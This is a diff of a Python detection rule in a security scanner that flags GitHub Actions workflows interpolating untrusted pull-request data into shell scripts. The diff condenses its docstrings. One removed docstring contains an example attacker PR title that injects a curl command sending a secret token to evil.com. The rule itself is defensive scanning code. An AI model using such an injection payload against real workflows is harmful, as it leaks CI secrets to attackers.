@@ -1,16 +1,4 @@
-"""GitHub Actions Script Injection Detection.
-
-Detects command injection vulnerabilities where untrusted PR data (titles, body,
-commit messages, branch names) is directly interpolated into shell scripts without
-proper sanitization.
-
-Attack Pattern:
-1. Workflow uses github.event.pull_request.* or github.event.issue.* in run: script
-2. Data not passed through environment variables (unsafe interpolation)
-3. Attacker crafts PR title like: "; curl http://evil.com/steal?token=$SECRET"
-
-CWE-77: Improper Neutralization of Special Elements used in a Command
-"""
+"""GitHub Actions Script Injection Detection."""
 
 import json
 import logging
@@ -61,14 +49,7 @@ GITHUB_SINKS = frozenset(
 
 
 def register_taint_patterns(taint_registry):
-    """Register GitHub Actions taint patterns for flow analysis.
-
-    This function is called by the orchestrator to register GitHub Actions
-    specific taint sources (untrusted PR/issue data) and sinks (shell execution).
-
-    Args:
-        taint_registry: TaintRegistry instance from orchestrator
-    """
+    """Register GitHub Actions taint patterns for flow analysis."""
     for source in PR_SOURCES:
         taint_registry.register_source(source, "github", "github")
 
@@ -93,20 +74,7 @@ UNTRUSTED_PATHS = frozenset(
 
 
 def find_pull_request_injection(context: StandardRuleContext) -> list[StandardFinding]:
-    """Detect script injection from untrusted PR/issue data.
-
-    Detection Logic:
-    1. Find steps with run: scripts
-    2. Check for references to untrusted github.event.* paths
-    3. Verify references are in 'run' location (not 'env' which is safer)
-    4. Report critical finding for command injection risk
-
-    Args:
-        context: Rule execution context with database path
-
-    Returns:
-        List of security findings
-    """
+    """Detect script injection from untrusted PR/issue data."""
     findings: list[StandardFinding] = []
 
     if not context.db_path:
@@ -196,21 +164,7 @@ def _build_injection_finding(
     severity: Severity,
     has_pr_target: bool,
 ) -> StandardFinding:
-    """Build finding for script injection vulnerability.
-
-    Args:
-        workflow_path: Path to workflow file
-        workflow_name: Workflow display name
-        job_key: Job key
-        step_name: Step display name
-        run_script: Shell script content
-        untrusted_refs: List of untrusted reference paths
-        severity: Calculated severity
-        has_pr_target: Whether workflow uses pull_request_target
-
-    Returns:
-        StandardFinding object
-    """
+    """Build finding for script injection vulnerability."""
     refs_str = ", ".join(untrusted_refs[:3])
     if len(untrusted_refs) > 3:
         refs_str += f" (+{len(untrusted_refs) - 3} more)"
